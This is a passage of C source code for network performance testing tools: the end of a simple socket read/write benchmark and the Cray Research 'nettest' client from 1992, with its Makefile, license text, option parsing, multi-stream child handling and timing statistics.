            totalbytes += rz;
            totalreads++;
            if(debugl) {
                fprintf(
                    stderr,
                    "(%d) read()=%d (errno=%d), total=%d\n",
                    s,rz,errno,totalbytes
                );
            }
            if(currentbytes >= 1000000) {

                /* show stats */
                etime = times(&tms);
                {
                    float       bps,secs;

                    secs = etime - stime;
                    secs /= hz;
                    if(secs > 0)
                    {
                        bps = (float)currentbytes / secs;
                    }
                    else
                    {
                        bps = 0;
                    }
                    fprintf(
                        stderr,
                        "%d reads, %d bytes in %g seconds, %.0f bps\n",
                        currentreads,
                        currentbytes,
                        secs,
                        bps
                    );
                }
                currentreads = currentbytes = 0;
                stime = etime;
            }
        }
        if(rz <= 0) {
            fprintf(stderr,"\r(%d) %d ",s,totalbytes);
            if(rz==0) {
                fprintf(stderr,"EOF--disconnecting\n");
            } else {
                perror("read from socket--disconnecting");
            }
        }
    }
}

int
usage(void)
{
    fprintf(
        stderr,
        "usage: %s {-r|-w} [-u] [-d] [-hhostname] [-pportnumber] [-bbufsz] [-nnbufs]\n",
        iam
    );
    fprintf(stderr,"       -r (read) or -w (write) manditory/exclusive\n");
    fprintf(stderr,"       -u for UDP packets\n");
    fprintf(stderr,"       -d enables debug messages\n");
    fprintf(stderr,"       Default hostname is %s\n",hostname);
    fprintf(stderr,"       Default port is %d\n",port);
    fprintf(stderr,"       Default bufsz is %d\n",bufsz);
    fprintf(stderr,"       Default nbufs is %d\n",nbufs);
    fprintf(stderr,"       Note: hostname,nbufs ignored if not -r\n");
    exit(1);
}

# endif /* NETT */

/*	____	____	____	____	____	____	____	____	*/

# ifdef CRAYNETT

::::::::::::::
craynettest-Makefile
::::::::::::::
#
# Makefile for nettest, a network performance analysis tool developed at Cray.
#
#ident $Revision: 1.4 $

DEPTH=..
include ${ROOT}/usr/include/make/commondefs

CFILES= nettest.c nettestd.c
TARGETS= nettest nettestd

LMKDEPFLAGS= ${NULLSUFFIX_MKDEPFLAG}
CFLAGS=-DNO_ISO 

default: ${TARGETS}

include ${COMMONRULES}
::::::::::::::
craynettest.c
::::::::::::::
static char USMID[] = "@(#)tcp/usr/etc/nettest/nettest.c	80.6	11/03/92 17:12:29";
/*
 * Copyright 1992 Cray Research, Inc.
 * All Rights Reserved.
 */
/*
 * Permission to use, copy, modify and distribute this software, in
 * source and binary forms, and its documentation, without fee is
 * hereby granted, provided that:  1) the above copyright notice and
 * this permission notice appear in all source copies of this
 * software and its supporting documentation; 2) distributions
 * including binaries display the following acknowledgement:  ``This
 * product includes software developed by Cray Research, Inc.'' in
 * the documentation or other materials provided with the distribution
 * and in all advertising materials mentioning features or use of
 * this software; 3) the name Cray Research, Inc. may not be used to
 * endorse or promote products derived from this software without
 * specific prior written permission; 4) the USMID revision line and
 * binary copyright notice are retained without modification in all
 * source and binary copies of this software; 5) the software is
 * redistributed only as part of a bundled package and not as a
 * separate product (except that it may be redistibuted separately if
 * if no fee is charged); and 6) this software is not renamed in any
 * way and is referred to as Nettest.
 *
 * THIS SOFTWARE IS PROVIDED AS IS AND CRAY RESEARCH, INC.
 * DISCLAIMS ALL WARRANTIES WITH REGARD TO THIS SOFTWARE, INCLUDING
 * ALL IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE.  IN NO EVENT SHALL CRAY RESEARCH, INC. BE
 * LIABLE FOR ANY SPECIAL, INDIRECT OR CONSEQUENTIAL DAMAGES OR ANY
 * DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS,
 * WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS
 * ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
 * PERFORMANCE OF THIS SOFTWARE.
 */
char copyright[] =
"@(#) Copyright 1992 Cray Research, Inc.\n\
 All rights reserved.\n";

#define SRCRT
#include "nettest.h"
#ifdef BSD44
#include <machine/endian.h>
#endif
#if defined(BSD44) || defined(sun) || defined(ultrix) || defined(sgi)
#include <netinet/in_systm.h>
#endif
#include <sys/wait.h>
#include <sys/un.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <sys/uio.h>
#include <sys/signal.h>

#ifndef NO_ISO
#include <netiso/iso.h>
#include <netiso/tp_user.h>
#endif /* NO_ISO */

#ifdef	CRAY
# include <time.h>
# ifndef HZ
#  define HZ CLK_TCK
# endif
#endif

#define	D_PIPE	1
#define	D_UNIX	2
#define	D_INET	3
#define	D_FILE	4
#define D_ISO	5

union {
	struct sockaddr		d_gen;
	struct sockaddr_in	d_inet;
	struct sockaddr_un	d_unix;
#ifndef NO_ISO
	struct sockaddr_iso	d_iso;
#endif /* NO_ISO */
} name;
int	namesize;
int	domain = D_INET;

int	nchunks = NCHUNKS;		/* 100 */
int	chunksize = CHUNK;		/* 4096 */
int	dflag = 0;
int	checkdata = 0;
int	seqdata = 0;
int	hash = 0;
int	fullbuf = 0;
int	kbufsize = 0;
int	nodelay = 0;
int	mesghdr = 0;

long	times();
#if	!defined(CRAY) && !defined(SYSV) && !defined(sgi)
#define	GETTIMES(a, b)	ftime(&a); times(&b);
#define	TIMETYPE	struct timeb
#else
#define	GETTIMES(a, b)	a = times(&b);
#define	TIMETYPE	long
#endif
#ifdef	TCP_WINSHIFT
int	winshift;
int	usewinshift;
#endif
int	tos;
int	maxchildren;
int	waitall;
int	sync_children = 0;
char	UT_MAGIC[8] = {	'U', 't', 'i', 'm', 'e', 's', '.', '.' };
struct magic_tms {
	char mt_magic[8];
	struct tms mt_tms;
	TIMETYPE mt_start;
	TIMETYPE mt_end;
};

struct in_addr hisaddr;

char	*hisname, _myname[256], *myname = _myname;

#ifndef	NO_ISO
struct	sockaddr_iso to_s = {sizeof(to_s), AF_ISO};
#endif

void do_children(), do_stream(), usage(), do_dgram(), prtimes();

int read(), recv();

int (*rfunc)() = read;

main(argc, argv)
	int argc;
	char **argv;
{
	register int	s, s2, port = PORTNUMBER;
	struct hostent	*gethostbyname(), *hp;
	char		*destname;
	register char	*portname = 0;
	int		type = SOCK_STREAM;
	int		i;
	int		on = 1;
	int		nconnections = 1;
#if	defined(SRCRT) && defined(IPPROTO_IP)
	char *srp = 0, *strrchr();
	unsigned long sourceroute(), srlen;
#endif
#ifndef	NO_ISO
	struct	sockaddr_iso *to = &to_s;
	union {
		int	port;
		char	data[sizeof(int)];
	} portnumber;
	struct hostinfo *hi;
#endif
	extern char	*optarg;
	extern int	optind;

	/*
	 * Set max children to allow for all the pipes to be
	 * created.  We assume that we will have one pipe open
	 * per child, plus stdin/stdout/stderr, plus one extra
	 * file descriptor for when we create the pipe.  So, we
	 * subract 4 from the maximum number of file descriptors
	 * to get the maximum number of children.
	 */
	maxchildren = getdtablesize() - 4;

	while ((i = getopt(argc, argv, "b:cCdfFhmn:p:s:S:t:Vw?")) != EOF) {
		switch(i) {
		case 'b':	/* kernel socket buffer size */
			kbufsize = atoval(optarg);
			break;
		case 'c':	/* check the data for correctness */
			++checkdata;
			break;
		case 'C':	/* use a sequential data pattern */
			++checkdata;	/* implies -c option */
			++seqdata;
			break;
		case 'd':	/* turn on socket debugging */
			dflag++;
			break;
		case 'f':	/* always post full buffers for reads */
			fullbuf++;
			break;
		case 'F':	/* turn off the NODELAY bit for TCP */
#ifdef	TCP_NODELAY
			nodelay++;
#else
			fprintf(stderr, "TCP nodelay option not supported\n");
			usage();
#endif
			break;
		case 'h':	/* show progress of data transfer */
			++hash;
			break;
		case 'm':	/* use sendmsg() instead of sendto() */
			++mesghdr;
			break;
		case 'n':	/* # connections to the destination */
			nconnections = atoi(optarg);
			if (nconnections < 1 || nconnections > maxchildren) {
				fprintf(stderr,
					"-n: value must be between 1 and %d\n",
					maxchildren);
				usage();
			}
			break;
		case 'p':	/* protocol to use */
			if (!strcmp(optarg, "tcp")) {
				domain = D_INET;
				type = SOCK_STREAM;
			} else if (!strcmp(optarg, "iso")) {
#ifndef	NO_ISO
				domain = D_ISO;
				type = SOCK_SEQPACKET;
#else	/* NO_ISO */
				fprintf(stderr, "iso protocol not supported\n");
				usage();
#endif /* NO_ISO */
			} else if (!strcmp(optarg, "udp")) {
				domain = D_INET;
				type = SOCK_DGRAM;
				nchunks = 1;
			} else if (!strcmp(optarg, "unix")) {
				domain = D_UNIX;
				type = SOCK_STREAM;
			} else if (!strcmp(optarg, "unixd")) {
				domain = D_UNIX;
				type = SOCK_DGRAM;
			} else if (!strcmp(optarg, "pipe")) {
				domain = D_PIPE;
				type = SOCK_STREAM;
			} else if (!strcmp(optarg, "file")) {
				domain = D_FILE;
				type = SOCK_STREAM;
			} else {
				fprintf(stderr, "Unknown protocol: %s\n", optarg);
				usage();
			}
			break;
		case 's':	/* Use the TCP window shift option */
#ifdef	TCP_WINSHIFT
			usewinshift++;
			winshift = atoi(optarg);
			if (winshift < -1 || winshift > 14) {
				fprintf(stderr, "window shift (-s) must be beteen -1 and 14\n");
				usage();
			}
#else
			fprintf(stderr, "window shift option not supported\n");
			usage();
#endif
			break;
		case 'S':	/* Set the IP Type-of-Service bits */
		case 't':	/* old flag for setting TOS... */
#ifdef	IP_TOS
			if ((tos = parsetos(optarg, "*")) < 0) {
				fprintf(stderr, "Bad tos argument: '%s'\n", optarg);
				usage();
			}

			break;
#else
			fprintf(stderr, "TOS (-%c) option not supported\n", (char)i);
			usage();
#endif
		case 'V':	/* Print the version of this program */
			printf("%s\n%s", &USMID[4], &copyright[4]);
			exit(0);

		case 'w':	/* use the MSG_WAITALL flag on recv() */
#ifdef	MSG_WAITALL
			waitall = MSG_WAITALL;
			rfunc = recv;
#else
			fprintf(stderr, "%s%s\n",
				"MSG_WAITALL (-w) not supported locally, ",
					"but will be passed on to server.");
			waitall = 1;	/* will be re-set to 0 below */
#endif
			break;

		case '?':
		default:
			usage();
		}
	}

	argc -= optind;
	argv += optind;

	/*
	 * Verify consitency of the specified options
	 */
	if (nodelay && ((domain != D_INET) || type != SOCK_STREAM)) {
		fprintf(stderr, "-F flag ignored (only valid for tcp\n");
		nodelay = 0;
	}
	if (mesghdr && (type != SOCK_DGRAM)) {
		fprintf(stderr,
			"-m flag ignored (only valid for udp and unixd\n");
	}
	if (tos && (domain != D_INET)) {
		fprintf(stderr,
			"tos value ignored (only valid for tcp and udp)\n");
		tos = 0;
	}
	if (waitall && ((domain == D_PIPE) ||
			(domain == D_FILE) ||
			(type == SOCK_DGRAM))) {
		fprintf(stderr,
#ifndef	NO_ISO
		    "-w flag ignored (only valid for tcp, iso and unix)\n"
#else
		    "-w flag ignored (only valid for tcp and unix)\n"
#endif
		);
	}
	if (checkdata &&
#ifndef	NO_ISO
			(type != SOCK_SEQPACKET) &&
#endif
			(type != SOCK_STREAM)) {
		fprintf(stderr, "-%c flag ignored (only valid for %s)\n",
		    seqdata ? 'C' : 'c',
#ifndef	NO_ISO
		    "tcp, iso, unix, pipe, and file"
#else
		    "tcp, unix, pipe, and file"
#endif
		);
	}
		

	/*
	 * Pick up the port/file name(s)
	 */
	if ((domain == D_INET) || (domain == D_ISO)) {
		hisname = myname;
		if (argc) {
			if (strcmp(*argv, "-"))
				hisname = *argv;
			--argc; ++argv;
		}
	} else if (domain == D_FILE) {
		if (argc < 2)
			usage();
		myname = *argv++;
		hisname = *argv++;
		argc -= 2;
	}

	if (argc) {
		if (strcmp(*argv, "-"))
			nchunks = atoval(*argv);
		--argc; ++argv;
		if (argc) {
			if (strcmp(*argv, "-"))
				chunksize = atoval(*argv);
			--argc; ++argv;
			if (argc) {
				if (strcmp(*argv, "-")) {
					port = atoi(*argv);
					portname = *argv;
				}
				if (argc > 1)
					usage();
			}
		}
	}


	switch(domain) {
	case D_PIPE:
		if (portname == 0)
			portname = PIPENAME;
		if (nconnections > 1) {
			fprintf(stderr, "-n flag not supported for pipe\n");
			usage();
		}
		sprintf(myname, "%sW", portname);
		if ((s2 = open(myname, 1)) < 0) {
			perror(myname);
			exit(1);
		}
		sprintf(myname, "%sR", portname);
		if ((s = open(myname, 0)) < 0) {
			perror(myname);
			close(s2);
			exit(1);
		}
		break;
	case D_FILE:
		if (nconnections > 1) {
			fprintf(stderr, "-n flag not supported for file\n");
			usage();
		}
		s2 = open(myname, 1);
		if (s2 < 0) {
			perror(myname);
			exit(1);
		}
		s = open(hisname, 0);
		if (s < 0) {
			perror(hisname);
			exit(1);
		}
		break;
	case D_UNIX:
		if (portname == 0)
			portname = (type == SOCK_DGRAM) ? UNIXDPORT : UNIXPORT;
		name.d_unix.sun_family = AF_UNIX;
		strcpy(name.d_unix.sun_path, portname);
		namesize = sizeof(name.d_unix) - sizeof(name.d_unix.sun_path)
			+ strlen(name.d_unix.sun_path);
		goto dosock;
		break;
	case D_INET:
		if (nconnections > 1 && type != SOCK_STREAM) {
			fprintf(stderr, "-n flag not supported for udp\n");
			usage();
		}
		namesize = sizeof(name.d_inet);
		name.d_inet.sin_family = AF_INET;
		gethostname(_myname, sizeof(_myname));
#if	defined(SRCRT) && defined(IPPROTO_IP)
		if (*hisname == '@' || *hisname == '!') {
			int temp;
			if ((destname = strrchr(hisname, ':')) == NULL)
				destname = strrchr(hisname, '@');
			destname++;
			srp = 0;
			temp = sourceroute(hisname, &srp, &srlen);
			if (temp == 0) {
#ifndef sun
				herror(srp);
#else
				printf("Can't get source route: %s\n", srp);
#endif
				return 0;
			} else if (temp == -1) {
				printf("Bad source route option: %s\n",
					hisname);
				return 0;
			} else {
#if	!defined(CRAY) || defined(s_addr)
				name.d_inet.sin_addr.s_addr = temp;
#else
				name.d_inet.sin_addr = temp;
#endif
			}
		} else {
#endif
			if ((hp = gethostbyname(hisname)) == NULL) {
				long tmp;

				tmp = inet_addr(hisname);
				if (tmp == -1) {
					fprintf(stderr, "no host entry fo %s\n", hisname);
					exit(1);
				}
#if	!defined(CRAY) || defined(s_addr)
				name.d_inet.sin_addr.s_addr = tmp;
#else
				name.d_inet.sin_addr = tmp;
#endif
			} else {
#if	!defined(CRAY) || defined(s_addr)
				bcopy(hp->h_addr, (char *)&name.d_inet.sin_addr,
								hp->h_length);
#else
				long	tmp;
				bcopy(hp->h_addr, (char *)&tmp, hp->h_length);
				name.d_inet.sin_addr = tmp;
#endif
			}
		}
		name.d_inet.sin_port = htons(port);
		goto dosock;
		break;
#ifndef NO_ISO
	case D_ISO:
		gethostname(_myname, sizeof(_myname));
		if (hisname != myname) {
			if ((hi = gethostinfo(hisname, 0, AF_ISO, 0, 0)) == 0) {
				perror("gethostinfo(AF_ISO)");
				exit(1);
			}
			to = (struct sockaddr_iso *)(*hi->h_addr_serv)->hs_addr;
		}
		name.d_iso = *to;
		namesize = sizeof(name.d_iso);
		name.d_iso.siso_tlen = 2;
		portnumber.port = htons(port);
		bcopy(&(portnumber.data[(sizeof(int)-2)]),
						TSEL(&(name.d_iso)), 2);
#endif /* NO_ISO */
	dosock:
		if (nconnections > 1)
			do_children(nconnections);
		s = socket(name.d_gen.sa_family, type, 0);
		if (s < 0) {
			perror("socket");
			exit(1);
		}
		if (dflag)
		   if (setsockopt(s, SOL_SOCKET, SO_DEBUG, &on, sizeof(on)) < 0)
			perror("setsockopt - SO_DEBUG");
#ifdef	IP_TOS
		if (tos)
		   if (setsockopt(s, IPPROTO_IP, IP_TOS, &tos, sizeof(tos)) < 0)
			perror("setsockopt - IP_TOS");
#endif
		if (kbufsize) {
#ifdef	SO_SNDBUF
			if (setsockopt(s, SOL_SOCKET, SO_SNDBUF, &kbufsize,
							sizeof(kbufsize)) < 0)
				perror("setsockopt - SO_SNDBUF");
			if (setsockopt(s, SOL_SOCKET, SO_RCVBUF, &kbufsize,
							sizeof(kbufsize)) < 0)
				perror("setsockopt - SO_RCVBUF");
#else	/* !SO_SNDBUF */
			printf("-b: cannot set local buffer sizes\n");
#endif	/* SO_SNDBUF */
		}
#ifdef	TCP_WINSHIFT
		if (usewinshift) {
			if (setsockopt(s, IPPROTO_TCP, TCP_WINSHIFT, &winshift,
							sizeof(winshift)) < 0)
				perror("setsockopt - TCP_WINSHIFT");
		}
#endif
#ifdef	TCP_NODELAY
		if (nodelay) {
			if (setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &nodelay,
							sizeof(nodelay)) < 0)
				perror("setsockopt - TCP_NODELAY");
		}
#endif
#if	defined(SRCRT) && defined(IPPROTO_IP)
		if (srp && setsockopt(s, IPPROTO_IP, IP_OPTIONS,
						(char *)srp, srlen) < 0)
			perror("setsockopt (IP_OPTIONS)");
#endif
		if (type == SOCK_DGRAM) {
			do_dgram(s);
			shutdown(s, 2);
			exit(0);
		}
		if (connect(s, (char *)&name, namesize) < 0) {
			perror("connect");
			exit(1);
		}
		s2 = s;
		break;
	}

	printf("Transfer: %d*%d bytes", nchunks, chunksize);
	if ((domain == D_INET) || (domain == D_ISO))
		printf(" from %9s to %9s\n", myname, hisname);
	else
		printf("\n");

	do_stream(s, s2);
	if (s == s2)
		shutdown(s, 2);
	else {
		close(s);
		close(s2);
	}
}

struct children {
	int	c_read;
	int	c_write;
	int	c_pid;
	int	c_ready;
	TIMETYPE c_start, c_end;
};

#define	CHILD_READ(n)	(childrenp[n].c_read)
#define	CHILD_WRITE(n)	(childrenp[n].c_write)
#define	CHILD_PID(n)	(childrenp[n].c_pid)
#define	CHILD_READY(n)	(childrenp[n].c_ready)
#define	CHILD_START(n)	(childrenp[n].c_start)
#define	CHILD_END(n)	(childrenp[n].c_end)
#define	ARRAY_SIZE(n)	((n)*sizeof(struct children))

/*
 * When called, this routine will fork off "nconnections" children, and
 * return in each of the children.  The parent program will hang around
 * for the children to die, printing out their statistics (read off of
 * a pipe set up beforehand).
 */
	void
do_children(nconnections)
	int nconnections;
{
	register int i;
	int n;
	struct children *childrenp;
	char *malloc();
	int status, child_error = 0;
	int notready = 0, nchildren;
	struct tms	tms1, tms2;
	TIMETYPE	start, end;
	char buf[1024];
	int gottimes;

	bzero((char *)&start, sizeof(start));
	bzero((char *)&end, sizeof(end));
	bzero((char *)&tms1, sizeof(tms1));
	bzero((char *)&tms2, sizeof(tms2));

	sync_children = getpid();

	if (sync_children != getpgrp()) {
		(void) setpgid(sync_children, sync_children);
		sync_children = getpgrp();
	}

	childrenp = (struct children *)malloc(ARRAY_SIZE(nconnections));
	if (childrenp == NULL) {
		fprintf(stderr,
			"malloc() for data to keep track of children failed\n");
		exit(1);
	}
	bzero(childrenp, ARRAY_SIZE(nconnections));

	for (i = 0; i < nconnections; i++) {
		if (pipe(&CHILD_READ(i)) < 0) {
			fprintf(stderr, "Cannot create pipe for child %d\n", i);
			CHILD_READ(i) = -1;
			continue;
		}
		switch(n = fork()) {
		case 0:
			/*
			 * In the child.  Close down all the pipes, dup
			 * our pipe to stdout and stderr, and return.
			 */
			for (n = 0; n <= i; n++) {
				if (CHILD_READ(n) >= 0)
					close(CHILD_READ(n));
			}
			dup2(CHILD_WRITE(i), 1);
			dup2(CHILD_WRITE(i), 2);
			close(CHILD_WRITE(i));
			return;

		case -1:
			close(CHILD_READ(i));
			CHILD_READ(i) = -1;
			close(CHILD_WRITE(i));
			CHILD_WRITE(i) = -1;
			fprintf(stderr, "Child %d not started\n", i);
			break;

		default:
			close(CHILD_WRITE(i));
			CHILD_PID(i) = n;
			notready++;
			break;
		}
	}
	nchildren = notready;
	while ((n = waitpid(-1, &status, WUNTRACED)) >= 0) {

		for (i = 0; i < nconnections; i++) {
			if (CHILD_PID(i) == n)
				break;
		}
		if (i == nconnections) {
			fprintf(stderr, "Unknown child [pid %d] died.\n", n);
			continue;
		}
		/*
		 * Check for stopped children.  When they are all
		 * stopped, send the SIGCONT to all of them to
		 * fire them up.
		 */
		if (WIFSTOPPED(status)) {
			if (CHILD_READY(i) == 0) {
				CHILD_READY(i) = 1;
				if (--notready == 0)
					killpg(sync_children, SIGCONT);
			}
			continue;
		}
		/*
		 * Check for children that have died before
		 * suspending themselves.
		 */
		if (CHILD_READY(i) == 0) {
			CHILD_READY(i) = 1;
			if (--notready == 0)
				killpg(sync_children, SIGCONT);
		}
		/*
		 * Print out the childs statistics.
		 */

		printf("Child %d statistics:\n", i);
		fflush(stdout);
		gottimes = 0;
		while ((n = read(CHILD_READ(i), buf, sizeof(buf))) > 0) {
			gottimes += extract_times(buf, &n, &tms2, &start, &end,
					&CHILD_START(i), &CHILD_END(i));
			if (n > 0)
				(void) write(1, buf, n);
		}
		close(CHILD_READ(i));
		if (!gottimes || !WIFEXITED(status) || WEXITSTATUS(status))
			child_error++;
		CHILD_PID(i) = -1;
	}

	/*
	 * Print the aggregate statistics.
	 */
	printf("--------------------\n");
	printf("Aggregate statistics for %d of %d children:\n",
					nchildren, nconnections);
	if (child_error)
		printf("  (May not be accurate due to errors in children)\n");
	printf("Transfer: %d*%d bytes over %d streams",
				nchunks, chunksize, nchildren);
	if ((domain == D_INET) || (domain == D_ISO))
		printf(" from %9s to %9s\n", myname, hisname);
	else
		printf("\n");
	nchunks *= nchildren;	/* for total amount of data transfered */
	prtimes(&start, &end, 0, &tms1, &tms2, 0);

	printf("\nSyncronization information:\n");
	printf("Child:    Start Duration      End\n");
	for (i = 0; i < nconnections; i++) {
		float	offset, duration;
		if (CHILD_READY(i) == 0)
			continue;

#if	!defined(CRAY) && !defined(SYSV) && !defined(sgi)
		offset = (CHILD_START(i).time - start.time)*1000L
			 + CHILD_START(i).millitm - start.millitm;
		duration = (CHILD_END(i).time - CHILD_START(i).time)*1000L
			 + CHILD_END(i).millitm - CHILD_START(i).millitm;
#else
		offset = (float)(CHILD_START(i) - start)*1000.0/HZ;
		duration = (float)(CHILD_END(i) - CHILD_START(i))*1000.0/HZ;
#endif
		printf("%5d: %8.4f %8.4f %8.4f\n", i, offset/1000.0,
			duration/1000.0, (offset + duration)/1000.0);
	}

	exit(0);
}

/*
 * Extract client timing information from the
 * data stream.  It returns non-zero or zero to
 * inicate whether or not timing information was
 * extracted from the buffer.
 *
 * This routine assumes that if we get all the timing
 * information, or we get none of it.  If the data is
 * split across read()s it will not be extracted.
 */
	int
extract_times(buf, np, tmsp, startp, endp, cstartp, cendp)
	char *buf;
	int *np;
	struct tms *tmsp;
	TIMETYPE *startp, *endp, *cstartp, *cendp;
{
	static struct magic_tms tms;
	register char *c1;

	/*
	 * Scan the buffer for the magic string that
	 * designates the beginning of the timing information.
	 */
	for (c1 = buf; c1 <= buf + *np - sizeof(tms); c1++) {
		/*
		 * Quick check to aviod overhead of strncmp()
		 */
		if (*c1 != UT_MAGIC[0])
			continue;
		if (strncmp(c1, UT_MAGIC, 8) == 0) {
			goto gotit;
		}
	}
	/* indicate that we did not get timing information */
	return(0);

gotit:
	/*
	 * Pull the timing data out of the buffer, and
	 * adjust the length value that was passed in.
	 */
	bcopy(c1, (char *)&tms, sizeof(tms));
	bcopy(c1 + sizeof(tms), c1, *np - (c1 + sizeof(tms) - buf));
	*np -= sizeof(tms);

	/*
	 * Add in the timing information, and update the ending
	 * time if it is later than what we've gotten so far.
	 */
	tmsp->tms_utime += tms.mt_tms.tms_utime;
	tmsp->tms_stime += tms.mt_tms.tms_stime;
#if	!defined(CRAY) && !defined(SYSV) && !defined(sgi)
	if ((tms.mt_start.time < startp->time) ||
	    ((tms.mt_start.time == startp->time) &&
	     (tms.mt_start.millitm < startp->millitm)) ||
		((startp->time == 0) && (startp->millitm == 0)))
		*startp = tms.mt_start;
	if ((tms.mt_end.time > endp->time) ||
	    ((tms.mt_end.time == endp->time) &&
	     (tms.mt_end.millitm > endp->millitm)))
		*endp = tms.mt_end;
#else
	if ((tms.mt_start < *startp) || (*startp == 0))
		*startp = tms.mt_start;
	if (tms.mt_end > *endp)
		*endp = tms.mt_end;
#endif
	*cstartp = tms.mt_start;
	*cendp = tms.mt_end;
	/* indicate that we extracted the timing information */
	return(1);
}

	int
atoval(s)
	register char *s;
{
	register int retval;

	retval = atoi(s);
	while (*s >= '0' && *s <= '9')
		++s;
	if (*s == 'k' || *s == 'K')
		retval *= 1024;
	return(retval);
}

	void
do_stream(in, out)
	register int in, out;
{
	register int	i, t, j, offset = 0, t2;
	register char	*cp;
	char		buf[128], *data, *malloc(), *orgdata;
	long		*cnts;
	register long	*ldp;
	struct tms	tms1, tms2, tms3;
	TIMETYPE	start, turnaround, end;
	register unsigned long loval;
#ifndef	CRAY
	register unsigned long hival;
#endif

#ifndef	NO_ISO
	/* read ISO CC - 0 bytes */
	if (domain == D_ISO) {
		if ((i = read(in, buf, sizeof(buf))) != 0) {
			fprintf(stderr, "read(ISO CC) failed\n");
			exit(1);
		}
	}
#endif	/* NO_ISO */
	if (seqdata && chunksize&0x7) {
		printf("data size must be multiple of 8.  %d rounded to %d\n",
			chunksize, chunksize & ~0x7);
		chunksize &= ~0x7;
	}
	sprintf(buf, "%d %d %d %d %d %d %d %d\n", nchunks, chunksize, fullbuf,
		kbufsize, tos, nodelay, seqdata, waitall);
#ifndef	MSG_WAITALL
	waitall = 0;	/* so we don't screw up the recv() */
#endif
	if (write(out, buf, strlen(buf)) != strlen(buf)) {
		perror("write1");
		exit(1);
	}
	for (cp = buf; ; ) {
		i = read(in, cp, 1);
		if (i != 1) {
			if (i < 0)
				perror("read (waiting to verify setup)");
			else
				fprintf(stderr, "nettest:  Read returned %d, expected 1\n", i);
			exit(1);
		}
		if (*cp == '\n')
			break;
		cp++;
	}
	*cp = '\0';
	if (cp - buf > 2)
		printf("remote server: %s\n", &buf[1]);
	if (cp - buf > 1 && buf[0] == '0')
		exit(1);
	orgdata = data = malloc(chunksize+8);
	if (data == NULL) {
		fprintf(stderr, "cannot malloc enough data space\n");
		exit(1);
	}
	cnts = (long *)malloc((chunksize+1)*sizeof(long));
	if (cnts == NULL) {
		fprintf(stderr, "cannot malloc enough stats space\n");
		exit(1);
	}
	bzero(cnts, (chunksize+1)*sizeof(long));

	if (checkdata && !seqdata)
		for (cp = data, i = 0; i < chunksize; )
			*cp++ = *("abcdefghijklmnopqrstuvwxyzABCDEF" + (i++/8)%32);
	if (hash)
		write(0, "\r\nWrite: ", 9);

	loval = 0;
#ifndef	CRAY
	hival = 0;
#endif

	if (sync_children) {
		/*
		 * Don't start until all the children
		 * are ready to go.  The master client
		 * will restart us.
		 */
		kill(getpid(), SIGSTOP);	/* suspend ourself */
	}
	GETTIMES(start, tms1);

	for (i = 0; i < nchunks; i++) {
		if (seqdata) {
			ldp = (long *)data;
			for (j = 0; j < chunksize/8; j++) {
#ifndef	CRAY
				*ldp++ = htonl(hival);
				*ldp++ = htonl(loval);
				if (++loval == 0)
					++hival;
#else
				*ldp++ = loval++;
#endif
			}
		}
		if ((t = write(out, data, chunksize)) < 0) {
			sprintf(buf, "write #%d:", i+1);
			goto bad;
		}
		if (t != chunksize)
			fprintf(stderr, "write: %d got back %d\n", chunksize, t);
		if (hash)
			write(1, "#", 1);
	}

	GETTIMES(turnaround, tms2);

	if (hash)
		write(0, "\r\nRead:  ", 9);

	loval = 0;
#ifndef	CRAY
	hival = 0;
#endif

	for (i = 0; i < nchunks || offset; i++) {
		if ((t = (*rfunc)(in, data, chunksize, waitall)) < 0) {
			sprintf(buf, "read #%d.%d", i+1, chunksize);
			goto bad;
		}
		if (t == 0) {
			fprintf(stderr, "EOF on file, block # %d\n", i);
			break;
		}
		cnts[t]++;
		if (fullbuf) {
			t2 = offset;
			offset += t;
			if (offset >= chunksize) {
				offset -= chunksize;
				if (hash)
					write(1, "#", 1);
			} else {
				--i;
				if (hash)
					write(1, ".", 1);
			}
		} else {
			while (t != chunksize) {

				if (hash)
					write(1, ".", 1);
				if ((t2 = (*rfunc)(in, data+t, chunksize-t,
							waitall)) < 0) {
					sprintf(buf, "read #%d.%d", i,
								chunksize-t);
					goto bad;
				}
				if (t2 == 0) {
					fprintf(stderr,
						"EOF on file, block # %d\n", i);
					break;
				}
				cnts[t2]++;
				t += t2;
			}
			if (hash)
				write(1, "#", 1);
			t2 = 0;
		}
		if (!checkdata)
			continue;
		if (!seqdata) {
		    for (cp = data, j = 0; j < t; cp++, j++) {
			if (*cp != *("abcdefghijklmnopqrstuvwxyzABCDEF" +
							((j+t2)/8)%32)) {
			    fprintf(stderr, "%d/%d(%d): got %d, expected %d\n",
				i, (j+t2), i*chunksize + (j+t2), *cp,
				*("abcdefghijklmnopqrstuvwxyzABCDEF" +
							((j+t2)/8)%32));
			}
		    }
		    continue;
		}
		t += data - orgdata;
		data = orgdata;
		ldp = (long *)data;
		for (j = 0; j < t/8; j++) {
#ifndef	CRAY
			t2 = ntohl(*ldp++) != hival;
			if ((ntohl(*ldp++) != loval) || t2) {
				printf("expected %8x%8x, got %8x%8x\n",
					hival, loval, ntohl(*(ldp-2)),
						ntohl(*(ldp-1)));
				hival = ntohl(*(ldp-2));
				loval = ntohl(*(ldp-1));
			}
			if (++loval == 0)
				++hival;
#else
			if (*ldp++ != loval) {
				printf("expected %16x, got %16x\n",
					loval, *(ldp-1));
				loval = *(ldp-1);
			}
			++loval;
#endif
		}
		t -= j*8;
		if (t) {
			*(long *)orgdata = *ldp;
#ifndef	CRAY
			*(((long *)orgdata) + 1) = *(ldp+1);
#endif
			data = orgdata + t;
		}
	}

	GETTIMES(end, tms3);

	if (sync_children) {
		/*
		 * We are a slave of the master client.  Write out
		 * a magic cookie and then the time it took to do
		 * the data transfer.
		 *
		 * Note that we do this before printing out the
		 * statistics, so that it it will be at the beginning
		 * of the data read by the master client, and it
		 * won't have to worry about this data getting
		 * split across read()s.
		 */
		struct magic_tms td;

		strncpy(td.mt_magic, UT_MAGIC, 8);
		td.mt_tms.tms_utime = tms3.tms_utime - tms1.tms_utime;
		td.mt_tms.tms_stime = tms3.tms_stime - tms1.tms_stime;
		td.mt_tms.tms_cutime = 0;
		td.mt_tms.tms_cstime = 0;
		td.mt_start = start;
		td.mt_end = end;
		write(1, &td, sizeof(td));
	}

